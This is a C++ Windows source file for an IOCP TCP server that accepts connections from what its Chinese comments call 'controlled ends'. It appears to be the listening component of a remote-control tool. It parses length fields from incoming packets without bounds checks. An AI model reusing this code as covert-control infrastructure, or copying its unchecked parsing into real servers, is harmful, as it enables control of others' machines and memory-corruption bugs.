#include "stdafx.h"
#include "IOCPServer.h"
#include "CpuUseage.h"
#include "Common.h"
#include "zlib.h"



CRITICAL_SECTION CIOCPServer::m_cs = {0};
const char chOpt = 1;    //开启的意思
CIOCPServer::CIOCPServer()
{
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2,2), &wsaData)!=0)
	{
		return;
	}
    //初始化套接字
	m_sockListen    = NULL;
	m_hEvent		= NULL;
	m_hThread       = NULL;
	m_bInit         = false;
	m_hCompletionPort = NULL;

	m_hKillEvent	= CreateEvent(NULL, TRUE, FALSE, NULL);

	m_pNotifyProc  = NULL;

	m_nWorkerCnt    = 0;
	m_nCurrentThreads	= 0;
	m_nBusyThreads		= 0;
	m_bTimeToKill		= false;


	m_nKeepLiveTime = 1000 * 60 * 3; // 超过三分钟没有数据就发送数据包探测一次

	m_nSendKbps = 0;
	m_nRecvKbps = 0;


	BYTE bPacketFlag[] = {'S', 'h', 'i', 'n', 'e'};           //这里是数据发送的标记  主控端同被控端字符必须一致
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag)); 
	m_nMaxConnections = 10000;                                //最大的连接数量

	InitializeCriticalSection(&m_cs);
}


CIOCPServer::~CIOCPServer()
{
	Shutdown();
	WSACleanup();
}


void CIOCPServer::Shutdown()
{
	closesocket(m_sockListen);	
	WSACloseEvent(m_hEvent);

	DeleteCriticalSection(&m_cs);
}


bool CIOCPServer::Initialize(NOTIFYPROC pNotifyProc, CMainFrame* pFrame, int nMaxConnections, int nPort)
{
	m_pNotifyProc	= pNotifyProc;														 //主窗口上的回调函数
	
	m_pFrame		=  pFrame;
	//创建监听套接字
	m_sockListen = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);     //创建监听套接字

	//初始化 套接字
	if (m_sockListen == INVALID_SOCKET)
	{
		return false;
	}

	 //创建与监听套机制相关联的事件 
	m_hEvent = WSACreateEvent();                          


	if (m_hEvent == WSA_INVALID_EVENT)
	{
		closesocket(m_sockListen);
		return false;
	}


	int nRet = WSAEventSelect(m_sockListen,											  //将监听套接字与事件进行关联并授予FD_ACCEPT的属性
		m_hEvent,
		FD_ACCEPT);

	if (nRet == SOCKET_ERROR)
	{
		closesocket(m_sockListen);
		return false;
	}

	SOCKADDR_IN		ServerAddr;		
	ServerAddr.sin_port   = htons(nPort);
	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_addr.s_addr = INADDR_ANY;                                           //初始化本地网卡


	//将监听套机字和网卡进行bind
	nRet = bind(m_sockListen, 
		(LPSOCKADDR)&ServerAddr, 
		sizeof(struct sockaddr));

	if (nRet == SOCKET_ERROR)
	{
		closesocket(m_sockListen);
		return false;
	}


	//进入监听
	nRet = listen(m_sockListen, SOMAXCONN);
	
	if (nRet == SOCKET_ERROR)
	{
		closesocket(m_sockListen);
		return false;
	}


	UINT dwThreadId = 0;

	m_hThread =
		(HANDLE)_beginthreadex(NULL,			
		0,					
		ListenThreadProc, 
		(void*)this,	     //向Thread回调函数传入this 方便我们的线程回调访问类中的成员    
		0,					
		&dwThreadId);	

	if (m_hThread != INVALID_HANDLE_VALUE)
	{
		InitializeIOCP();    //这里主要是创建完成端口并创建工作线程来处理 来访信号的工作请求
		
		m_bInit = true;
		
		return true;
	}

	return false;


}



unsigned CIOCPServer::ListenThreadProc(LPVOID lParam)   //监听线程
{
	CIOCPServer* pThis = (CIOCPServer*)(lParam);


	WSANETWORKEVENTS events;

	while(1)
	{
		//这里是我们自己的程序要退出由主对话框  向该线程发送 退出线程的事件
		if (WaitForSingleObject(pThis->m_hKillEvent, 100) == WAIT_OBJECT_0)
		{
			break;     
		}

		DWORD dwRet;
		//等待与套接字相关联的事件
		dwRet = WSAWaitForMultipleEvents(1,
			&pThis->m_hEvent,
			FALSE,
			1000,
			FALSE);    //等待我们与监听套机制相关联的事件1秒 如果函数调用成功但是事件没有响应就Timeout

		if (dwRet == WSA_WAIT_TIMEOUT)
		{
			continue;
		}

		int nRet = WSAEnumNetworkEvents(pThis->m_sockListen,    //如果事件授信 我们就将该事件转换成一个网络事件 进行 判断
			pThis->m_hEvent,
			&events);

		if (nRet == SOCKET_ERROR)
		{
			break;
		}

		if (events.lNetworkEvents & FD_ACCEPT)
		{
			if (events.iErrorCode[FD_ACCEPT_BIT] == 0)
			{
				pThis->OnAccept();                    //如果是一个链接请求我们就进入OnAccept()函数进行处理
			}
			else
			{
				break;
			}

		}

	} 
	return 0; 
}


unsigned CIOCPServer::ThreadPoolFunc (LPVOID thisContext)    
{

	ULONG ulFlags = MSG_PARTIAL;
	CIOCPServer* pThis = (CIOCPServer*)(thisContext);
	

	HANDLE hCompletionPort = pThis->m_hCompletionPort;

	DWORD dwIoSize;
	LPOVERLAPPED lpOverlapped;
	ClientContext* lpClientContext;
	OVERLAPPEDPLUS*	pOverlapPlus;
	bool			bError;
	bool			bEnterRead;

	InterlockedIncrement(&pThis->m_nCurrentThreads);  //4
	InterlockedIncrement(&pThis->m_nBusyThreads);     //4


	for (BOOL bStayInPool = TRUE; bStayInPool && pThis->m_bTimeToKill == false;) 
	{
		pOverlapPlus	= NULL;
		lpClientContext = NULL;
		bError			= false;
		bEnterRead		= false;

		InterlockedDecrement(&pThis->m_nBusyThreads);//3


		BOOL bIORet = GetQueuedCompletionStatus(
			hCompletionPort,
			&dwIoSize,  //26
			(LPDWORD) &lpClientContext,
			&lpOverlapped,INFINITE);           //查看完成端口中的状态

		DWORD dwIOError = GetLastError();
		pOverlapPlus = CONTAINING_RECORD(lpOverlapped, OVERLAPPEDPLUS, m_ol);


		int nBusyThreads = InterlockedIncrement(&pThis->m_nBusyThreads);   

		if (!bIORet && dwIOError != WAIT_TIMEOUT )   //当对方的套机制发生了关闭
		{
			if (lpClientContext && pThis->m_bTimeToKill == false)
			{
				pThis->RemoveStaleClient(lpClientContext, FALSE);
			}
			continue;
		}

		if (!bError) 
		{

			//分配一个新的线程到线程到线程池
			if (nBusyThreads == pThis->m_nCurrentThreads)
			{
				if (nBusyThreads < pThis->m_nThreadPoolMax)
				{
					if (pThis->m_cpu.GetUsage() > pThis->m_nCPUHighThreadshold)
					{
						UINT nThreadID = -1;

						HANDLE hThread = (HANDLE)_beginthreadex(NULL,				
																0,				
																ThreadPoolFunc,  
																(void*) pThis,	    
																0,					
																&nThreadID);	

						CloseHandle(hThread);
					}
				}
			}

			if (!bIORet && dwIOError == WAIT_TIMEOUT)
			{
				if (lpClientContext == NULL)
				{
					if (pThis->m_cpu.GetUsage() < pThis->m_nCPULowThreadshold)
					{

						if (pThis->m_nCurrentThreads > pThis->m_nThreadPoolMin)
							bStayInPool =  FALSE;
					}

					bError = true;
				}
			}
		}


		if (!bError)
		{
			if(bIORet && NULL != pOverlapPlus && NULL != lpClientContext) 
			{
				try
				{                            //IoWrite                Context        26
					pThis->ProcessIOMessage(pOverlapPlus->m_ioType, lpClientContext, dwIoSize);     //向窗口传递我们的处理的请求
				}
				catch (...) {}
			}
		}

		if(pOverlapPlus)
		{
			delete pOverlapPlus; 
		}
	}

	InterlockedDecrement(&pThis->m_nWorkerCnt);

	InterlockedDecrement(&pThis->m_nCurrentThreads);
	InterlockedDecrement(&pThis->m_nBusyThreads);
	return 0;
} 


bool CIOCPServer::InitializeIOCP(void)
{

	SOCKET s;
	DWORD i;
	UINT  nThreadID;
	SYSTEM_INFO systemInfo;

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if ( s == INVALID_SOCKET ) 
	{
		return false;
	}

	//创建完成端口，套接字s 只是用来占位
	m_hCompletionPort = CreateIoCompletionPort((HANDLE)s, NULL, 0, 0 );  //创建一个完成端口 这样我们就可以将工作的套接字投递给该完成端口然后由系统的线程池进行处理
	if ( m_hCompletionPort == NULL ) 
	{
		closesocket( s );
		return false;
	}
	closesocket( s );

	GetSystemInfo(&systemInfo);  //获得PC中有几核

	m_nThreadPoolMin  = systemInfo.dwNumberOfProcessors * HUERISTIC_VALUE;
	m_nThreadPoolMax  = m_nThreadPoolMin;
	m_nCPULowThreadshold = 10; 
	m_nCPUHighThreadshold = 75; 

	m_cpu.Init();   //要获得当前进程占有CPU的效率的初始化函数


	UINT nWorkerCnt = systemInfo.dwNumberOfProcessors * HUERISTIC_VALUE;

	HANDLE hWorker;
	m_nWorkerCnt = 0;

	for ( i = 0; i < nWorkerCnt; i++ )    
	{
		hWorker = (HANDLE)_beginthreadex(NULL,	             //创建工作线程目的是处理投递到完成端口中的任务			
			0,						
			ThreadPoolFunc,     		
			(void*) this,			
			0,						
			&nThreadID);			
		if (hWorker == NULL ) 
		{
			CloseHandle( m_hCompletionPort );
			return false;
		}

		m_nWorkerCnt++;

		CloseHandle(hWorker);
	}

	return true;
} 




void CIOCPServer::OnAccept()
{

	SOCKADDR_IN	SockAddr;
	SOCKET		clientSocket;

	int			nRet;
	int			nLen;

//	if (m_bTimeToKill || m_bDisconnectAll)
//		return;


	nLen = sizeof(SOCKADDR_IN);
	clientSocket = accept(m_sockListen,
		(LPSOCKADDR)&SockAddr,
		&nLen);                     //通过我们的监听套接字来生成一个与之信号通信的套接字

	if (clientSocket == SOCKET_ERROR)
	{
		nRet = WSAGetLastError();
		if (nRet != WSAEWOULDBLOCK)
		{
			return;
		}
	}

	//我们在这里为每一个到达的信号维护了一个与之关联的数据结构这里简称为用户的上下背景文
	ClientContext* pContext = AllocateContext();

	if (pContext == NULL)
	{
		return;
	}

	pContext->m_Socket = clientSocket;

	// Fix up In Buffer
	pContext->m_wsaInBuffer.buf = (char*)pContext->m_byInBuffer;
	pContext->m_wsaInBuffer.len = sizeof(pContext->m_byInBuffer);


	//并将我们刚刚得到通信套接字与到完成端口相关联，如果客户与之通信 就由我们的完成端口中的工作线程来完成
	if (!AssociateSocketWithCompletionPort(clientSocket, m_hCompletionPort, (DWORD)pContext))
	{
		delete pContext;
		pContext = NULL;

		closesocket( clientSocket );
		closesocket( m_sockListen );
		return;
	}

	//设置套接字的选项卡 Set KeepAlive 开启保活机制  SO_KEEPALIVE 保持连接检测对方主机是否崩溃
	//如果2小时内在此套接口的任一方向都没有数据交换，TCP就自 动给对方 发一个保持存活
	if (setsockopt(pContext->m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char*)&chOpt, sizeof(chOpt)) != 0)
	{
	}

	//设置超时详细信息
	tcp_keepalive	klive;
	klive.onoff = 1; // 启用保活
	klive.keepalivetime = m_nKeepLiveTime;       //超过3分钟没有数据，就发送探测包
	klive.keepaliveinterval = 1000 * 10; //重试间隔为10秒 Resend if No-Reply
	WSAIoctl
		(
		pContext->m_Socket, 
		SIO_KEEPALIVE_VALS,
		&klive,
		sizeof(tcp_keepalive),
		NULL,
		0,
		(unsigned long *)&chOpt,
		0,
		NULL
		);
	//在做服务器时，如果发生客户端网线或断电等非正常断开的现象，
	//如果服务器没有设置SO_KEEPALIVE选项，则会一直不关闭SOCKET。
	//因为上的的设置是默认两个小时时间太长了所以我们就修正这个值

	CLock cs(m_cs, "OnAccept" );
	m_listContexts.AddTail(pContext);     //插入到我们的内存列表中


	OVERLAPPEDPLUS	*pOverlap = new OVERLAPPEDPLUS(IOInitialize);   //注意这里的重叠IO请求是 用户请求上线

	BOOL bSuccess = PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD)pContext, &pOverlap->m_ol);    //Ol->Event  ol   -->ol  IOInitialize
	//因为我们接受到了一个用户上线的请求那么我们就将该请求发送给我们的完成端口 让我们的工作线程处理它

	if ( (!bSuccess && GetLastError() != ERROR_IO_PENDING))  //如果投递失败
	{            
		RemoveStaleClient(pContext,TRUE);
		return;
	}

	 //回调函数处理  查看Initialize  的使用 也就是用户的链接请求到达
	//这里也就是相当于调用 CRemoteDlg::NotifyProc 函数
	m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_CLIENT_CONNECT);     

	PostRecv(pContext);                                                //向该上线用户投递接收数据的异步请求



	/*
	Windows的IOCP模型本身并没有提供关于超时的支持,所以一切都要有程序员来完成.并且超时控制对于服务器程序来说是必须的: 
	服务器程序对一个新的客户端连接需要在完成端口上投递一个 WSARecv() 操作,以接收客户端的请求,如果这个客户端连接一直不发送数据(所谓的恶意连接)
	那么投递的这个请求永远不会从完成端口队列中返回,占用了服务器资源.如果有大量的恶意连接,服务很快就会不堪重负.所以服务器程序必须为投递给完成端口的请求设置一个超时时间.

	*/
}




void CIOCPServer::PostRecv(ClientContext* pContext)
{
	OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IORead);    //向我们的刚上线的用户的投递一个接受数据的请求  如果用户的第一个数据包到达也就就是被控端的登陆请求到达我们的工作线程就
	ULONG			ulFlags = MSG_PARTIAL;					   //会响应	并调用ProcessIOMessage函数
	DWORD			dwNumberOfBytesRecvd;
	UINT nRetVal = WSARecv(pContext->m_Socket, 
		&pContext->m_wsaInBuffer,
		1,
		&dwNumberOfBytesRecvd, 
		&ulFlags,
		&pOverlap->m_ol, 
		NULL);

	if ( nRetVal == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING) 
	{
		RemoveStaleClient(pContext, FALSE);
	}
}



BOOL CIOCPServer::AssociateSocketWithCompletionPort(SOCKET socket, HANDLE hCompletionPort, DWORD dwCompletionKey)
{
	HANDLE h = CreateIoCompletionPort((HANDLE)socket, hCompletionPort, dwCompletionKey, 0);
	return h == hCompletionPort;
}







///////////////////////////////////////////////////////////////////////////////////////////////////////////用户的上下背景文结构申请函数
ClientContext*  CIOCPServer::AllocateContext()
{
	ClientContext* pContext = NULL;

	CLock cs(CIOCPServer::m_cs, "AllocateContext");       //这里的m_cs可是个static   

	if (!m_listFreePool.IsEmpty())                        //判断我们的内存池中有无内存 有从内存池中取得
	{
		pContext = m_listFreePool.RemoveHead();
	}
	else
	{
		pContext = new ClientContext;                    //没有则动态申请
	}

	if (pContext != NULL)
	{

		ZeroMemory(pContext, sizeof(ClientContext));
		pContext->m_bIsMainSocket = false;
		memset(pContext->m_Dialog, 0, sizeof(pContext->m_Dialog));
	}
	return pContext;
}

void CIOCPServer::MoveToFreePool(ClientContext *pContext)
{
	CLock cs(m_cs, "MoveToFreePool");

	POSITION pos = m_listContexts.Find(pContext);
	if (pos) 
	{
		pContext->m_CompressionBuffer.ClearBuffer();
		pContext->m_WriteBuffer.ClearBuffer();
		pContext->m_DeCompressionBuffer.ClearBuffer();
		pContext->m_ResendWriteBuffer.ClearBuffer();
		m_listFreePool.AddTail(pContext);                            //回收至内存池
		m_listContexts.RemoveAt(pos);                                //从内存结构中移除
	}
}

void CIOCPServer::RemoveStaleClient(ClientContext* pContext, BOOL bGraceful)
{
	CLock cs(m_cs, "RemoveStaleClient");


/*	LINGER lingerStruct;


	if ( !bGraceful ) 
	{

		lingerStruct.l_onoff = 1;
		lingerStruct.l_linger = 0;
		setsockopt( pContext->m_Socket, SOL_SOCKET, SO_LINGER,
			(char *)&lingerStruct, sizeof(lingerStruct) );
	}*/




	if (m_listContexts.Find(pContext))    //在内存中查找该用户的上下背景文数据结构
	{

		CancelIo((HANDLE) pContext->m_Socket);  //取消在当前套接字的异步IO   -->PostRecv    

		closesocket( pContext->m_Socket );      //关闭套接字
		pContext->m_Socket = INVALID_SOCKET;

		while (!HasOverlappedIoCompleted((LPOVERLAPPED)pContext))   //判断还有没有异步IO请求在当前套接字上
			Sleep(0);

		m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_CLIENT_DISCONNECT);   //向桌面投递用户下线 消息

		MoveToFreePool(pContext);  //将该内存结构回收至内存池
	}
}


bool CIOCPServer::OnClientInitializing(ClientContext* pContext, DWORD dwIoSize)
{
	
	return true;		
}



bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
{
	CLock cs(CIOCPServer::m_cs, "OnClientReading");
	try
	{

		static DWORD nLastTick = GetTickCount();
		static DWORD nBytes = 0;
		nBytes += dwIoSize;

		if (GetTickCount() - nLastTick >= 1000)
		{
			nLastTick = GetTickCount();
			InterlockedExchange((LPLONG)&(m_nRecvKbps), nBytes);     //统计各个接收到的数据包的大小
			nBytes = 0;
		}

	

		if (dwIoSize == 0)    //对方关闭了套接字
		{
			RemoveStaleClient(pContext, FALSE);
			return false;
		}

		if (dwIoSize == FLAG_SIZE && memcmp(pContext->m_byInBuffer, m_bPacketFlag, FLAG_SIZE) == 0)    //如果只接收到Shine关键字 是被控端请求主控端重新发送数据
		{
			// 重新发送
			//Send(pContext, pContext->m_ResendWriteBuffer.GetBuffer(), pContext->m_ResendWriteBuffer.GetBufferLen());  //重新发送备份数据
			// 必须再投递一个接收请求
			PostRecv(pContext);
			return true;
		}
		pContext->m_CompressionBuffer.Write(pContext->m_byInBuffer,dwIoSize);    //将接收到的数据拷贝到我们自己的内存中

		m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_RECEIVE);                  //通知界面


		while (pContext->m_CompressionBuffer.GetBufferLen() > HDR_SIZE)          //查看数据包里的数据
		{
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, pContext->m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));

			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)   //Shine
				throw "Bad Buffer";

			int nSize = 0;
			CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));

			// Update Process Variable
			//pContext->m_nTransferProgress = pContext->m_CompressionBuffer.GetBufferLen() * 100 / nSize;

			if (nSize && (pContext->m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
			
				pContext->m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));    //读取各种头部

				pContext->m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				pContext->m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));

		
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];

				if (pData == NULL || pDeCompressionData == NULL)
					throw "Bad Allocate";

				pContext->m_CompressionBuffer.Read(pData, nCompressLength);

	
				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);     //解压数据
	
				if (nRet == Z_OK)
				{
					pContext->m_DeCompressionBuffer.ClearBuffer();
					pContext->m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
					m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_RECEIVE_COMPLETE);
				}
				else
				{
					throw "Bad Buffer";
				}

				delete [] pData;
				delete [] pDeCompressionData;
				pContext->m_nMsgIn++;                          //已经接受到了一个完整的数据包
			}
			else
				break;
		}
		PostRecv(pContext);   //投递新的接收数据的请求
	}catch(...)
	{
		pContext->m_CompressionBuffer.ClearBuffer();
		// 要求重发，就发送0, 内核自动添加数包标志
	//	Send(pContext, NULL, 0);
		PostRecv(pContext);
	}

	return true;
}


void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize)   //1    1
{
	if (pContext == NULL)
	{
		return;
	}

	try
	{
		if (nSize > 0)
		{
			//压缩数据
			unsigned long	destLen = (double)nSize * 1.001  + 12;
			LPBYTE			pDest = new BYTE[destLen];
			int	nRet = compress(pDest, &destLen, lpData, nSize);

			if (nRet != Z_OK)
			{
				delete [] pDest;
				return;
			}

			//////////////////////////////////////////////////////////////////////////
			LONG nBufLen = destLen + HDR_SIZE;
			
			pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));  //Shine
		
			pContext->m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));     //26    
		
			pContext->m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));        //1
			
			pContext->m_WriteBuffer.Write(pDest, destLen);                           //数据包头的构建
			delete [] pDest;

	
			LPBYTE lpResendWriteBuffer = new BYTE[nSize];
			CopyMemory(lpResendWriteBuffer, lpData, nSize);
			pContext->m_ResendWriteBuffer.ClearBuffer();
			pContext->m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	     // 备份发送的数据
			delete [] lpResendWriteBuffer;
		}
		else // 要求重发
		{
			pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
			pContext->m_ResendWriteBuffer.ClearBuffer();
			pContext->m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
		}

	
		//向完成端口投递发送数据的请求 是为了能触发我们的回调例程OnClientWriting 但是数据是0

		OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IOWrite);
		PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD) pContext, &pOverlap->m_ol);     //GetQueue

		pContext->m_nMsgOut++;
	}catch(...){}
}



bool CIOCPServer::OnClientWriting(ClientContext* pContext, DWORD dwIoSize)   //dwIoSize 是完成了多少数据
{
	try
	{

		static DWORD nLastTick = GetTickCount();
		static DWORD nBytes = 0;

		nBytes += dwIoSize;

		if (GetTickCount() - nLastTick >= 1000)
		{
			nLastTick = GetTickCount();
			InterlockedExchange((LPLONG)&(m_nSendKbps), nBytes);
			nBytes = 0;
		}
	
		ULONG ulFlags = MSG_PARTIAL;

	
		pContext->m_WriteBuffer.Delete(dwIoSize);             //将完成的数据从数据结构中去除
		if (pContext->m_WriteBuffer.GetBufferLen() == 0)
		{
			pContext->m_WriteBuffer.ClearBuffer();
			return true;		                             //走到这里说明我们的数据真正完全发送
		}
		else
		{
			OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IOWrite);           //数据没有完成  我们继续投递 发送请求

			m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_TRANSMIT);


			pContext->m_wsaOutBuffer.buf = (char*) pContext->m_WriteBuffer.GetBuffer();
			pContext->m_wsaOutBuffer.len = pContext->m_WriteBuffer.GetBufferLen();                 //获得剩余的数据和长度    

			int nRetVal = WSASend(pContext->m_Socket, 
				&pContext->m_wsaOutBuffer,
				1,
				&pContext->m_wsaOutBuffer.len, 
				ulFlags,
				&pOverlap->m_ol, 
				NULL);


			if ( nRetVal == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING )
			{
				RemoveStaleClient( pContext, FALSE );
			}

		}
	}catch(...){}
	return false;			
}